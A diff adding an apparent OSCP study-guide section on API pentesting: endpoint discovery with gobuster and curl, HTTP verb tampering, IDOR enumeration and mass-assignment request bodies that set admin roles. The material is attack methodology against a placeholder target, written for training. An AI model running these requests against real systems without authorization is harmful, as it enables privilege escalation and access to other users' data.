@@ -452,6 +452,73 @@ sqlmap -u "http://target.com/search" --data="param1=blah&param2=blah" --cookie="
 
 ---
 
+## 6. API Testing Methodology (REST / IDOR / Verb Tampering)
+
+### 6.1 API Endpoint Discovery
+**Explanation:** Modern web apps often expose REST API endpoints that are less hardened than the main UI — hidden admin endpoints, debug routes, and older API versions (`/api/v1/` alongside `/api/v2/`) are common on OSCP boxes.
+
+**Discovery techniques:**
+```bash
+# Common API path brute-force
+gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+gobuster dir -u http://target/api -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
+
+# Check for API documentation endpoints
+curl -s http://target/swagger.json
+curl -s http://target/openapi.json
+curl -s http://target/api-docs
+curl -s http://target/.well-known/openapi.json
+curl -s http://target/swagger/v1/swagger.json
+curl -s http://target/v2/api-docs          # Spring Boot Swagger
+
+# Enumerate API versions
+curl -s http://target/api/v1/users
+curl -s http://target/api/v2/users
+```
+
+### 6.2 HTTP Verb Tampering
+**Explanation:** Access controls often only check `GET`/`POST`. Try other verbs against restricted endpoints — `PUT`, `DELETE`, `PATCH`, and `OPTIONS` may bypass authorization checks.
+```bash
+# Test all common verbs against a restricted endpoint
+for verb in GET POST PUT DELETE PATCH OPTIONS HEAD; do
+    echo "--- $verb ---"
+    curl -s -o /dev/null -w "%{http_code}" -X $verb http://target/api/admin/users
+    echo
+done
+```
+
+### 6.3 IDOR (Insecure Direct Object Reference)
+**Explanation:** When the API uses predictable identifiers (numeric IDs, sequential UUIDs) in URLs or request bodies, test for horizontal privilege escalation by changing the ID to another user's resource.
+```bash
+# Numeric ID enumeration
+curl -s -H "Authorization: Bearer <YOUR_TOKEN>" http://target/api/users/1
+curl -s -H "Authorization: Bearer <YOUR_TOKEN>" http://target/api/users/2    # another user's data?
+
+# Test in request body (POST/PUT)
+curl -s -X PUT -H "Content-Type: application/json" -H "Authorization: Bearer <TOKEN>" \
+    -d '{"id": 2, "role": "admin"}' http://target/api/users/2    # mass assignment / role change
+
+# GUID/UUID — check if sequential or predictable
+# If you see UUIDs in responses for your own objects, try decrementing/incrementing
+```
+
+### 6.4 Mass Assignment / Parameter Pollution
+**Explanation:** Send extra fields in a request body that the API doesn't expect from your role — some frameworks auto-bind all JSON keys to the model, so adding `"role": "admin"` or `"isAdmin": true` can escalate privileges.
+```bash
+# Registration endpoint — try adding role/privilege fields
+curl -X POST http://target/api/register -H "Content-Type: application/json" \
+    -d '{"username": "test", "password": "test", "role": "admin"}'
+
+# Profile update — try adding fields not shown in the UI
+curl -X PUT http://target/api/profile -H "Authorization: Bearer <TOKEN>" \
+    -H "Content-Type: application/json" \
+    -d '{"name": "test", "isAdmin": true, "credits": 9999}'
+```
+
+**Reference:** https://book.hacktricks.wiki/en/pentesting-web/idor.html · https://owasp.org/API-Security/
+
+---
+
 ### Consolidated Reference List
 - File Upload: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
 - File Upload (HackTricks): https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
